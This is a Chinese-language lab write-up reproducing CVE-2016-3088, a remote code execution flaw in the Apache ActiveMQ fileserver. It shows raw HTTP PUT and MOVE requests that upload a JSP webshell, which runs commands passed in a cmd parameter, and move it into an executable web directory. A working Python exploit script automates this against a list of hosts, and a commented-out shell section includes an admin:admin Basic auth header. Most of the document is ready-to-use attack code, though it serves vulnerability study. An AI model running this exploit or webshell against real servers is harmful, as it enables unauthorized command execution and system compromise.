# CVE-2016-3088(Apache ActiveMQ 远程代码执行漏洞复现)

## 复现环境
#### 靶机：
* IP：192.168.1.104:8161

## 复现过程
Fiddler发包：
```
PUT http://192.168.1.104:8161/fileserver/cytotest.txt HTTP/1.1
Host: 192.168.1.104:8161
Content-Length: 353

<%@ page import="java.io.*"%>

<%
  out.print("Cytosine Test<br>");

  String strcmd = request.getParameter("cmd");
  String line = null;

  Process p = Runtime.getRuntime().exec(strcmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

  while((line=br.readLine())!=null){
    out.print(line+"<br>");
  }
%>

```
响应：
```
HTTP/1.1 204 No Content
Server: Jetty(8.1.16.v20140903)

```

移动并更名：
```
MOVE http://192.168.1.104:8161/fileserver/cytotest.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/api/cytotest.jsp
Host: 192.168.1.104:8161
Content-Length: 2

```

响应：
```
HTTP/1.1 204 No Content
Server: Jetty(8.1.16.v20140903)

```

浏览器get request：
```
http://192.168.1.104:8161/api/b.jsp?cmd=whoami
http://192.168.1.104:8161/api/b.jsp?cmd=ls -al
```
效果如下图：
![](imgs/whoami.png)
![](imgs/ls.png)

## 原因分析
ActiveMQ的FileServer允许用户通过PUT方法上传文件到指定目录（但此目录没有执行权限）  
同时处理HTTP MOVE方法的代码没有对目的路径做过滤  
因此，可以通过PUT请求上传一个webshell，然后再通过MOVE方法将webshell移动至有执行权限的目录中。

## exp
自己太菜，如果从主机发现开始写，就写不完了，所以就把上面两步封装了一下  
代码如下：
```
import requests


def main():
    Hosts = ['192.168.1.104:8161']

    for host in Hosts:
        # put request
        url_put = 'http://' + host + '/fileserver/cytotest.txt'
        data_put = """
        <%@ page import="java.io.*"%>
    
        <%
          out.print("Cytosine Test<br>");
    
          String strcmd = request.getParameter("cmd");
          String line = null;
    
          Process p = Runtime.getRuntime().exec(strcmd);
          BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    
          while((line=br.readLine())!=null){
            out.print(line+"<br>");
          }
        %>
        """
        headers_put = {'Host': '192.168.1.104:8161'}

        response_put = requests.put(url=url_put, data=data_put, headers=headers_put)

        if response_put.status_code == 204:
            # move request
            url_move = 'http://' + host + '/fileserver/cytotest.txt'
            headers_move = {'Destination': 'file:///opt/activemq/webapps/api/cytotest.jsp',
                            'Host': '192.168.1.104:8161'}

            response_move = requests.request('MOVE', url_move, headers=headers_move)

            if response_move.status_code == 204:
                print("写入成功，访问如下链接，'cmd='后面加命令即可：")
                print("http://" + host + "/api/cytotest.jsp?cmd=")
                print("For example:http://" + host + "/api/cytotest.jsp?cmd=whoami")
                # # shell
                # userInput = input('$ ')
                # params_get = {'cmd':userInput}
                # headers_get = {'Authorization':'Basic YWRtaW46YWRtaW4='}
                # r_get = requests.get('http://' + host + '/api/cytotest.jsp',params=params_get)
                #
                # bodyStart = re.match()
                #
                # print(r_get.text)
                #
                # 发现返回401 抓包没发现admin admin怎么传过去的 所以先都注释了吧喵 QAQ


if __name__ == '__main__':
    main()

```

## 参考资料
1. [Apache ActiveMQ Fileserver远程代码执行漏洞(CVE-2016-3088)_Seebug](https://www.seebug.org/vuldb/ssvid-96268)
2. [valhub CVE-2016-3088 _GitHub](https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088)
3. [Python Requests Interface Document_python-requests](http://docs.python-requests.org/en/master/api/)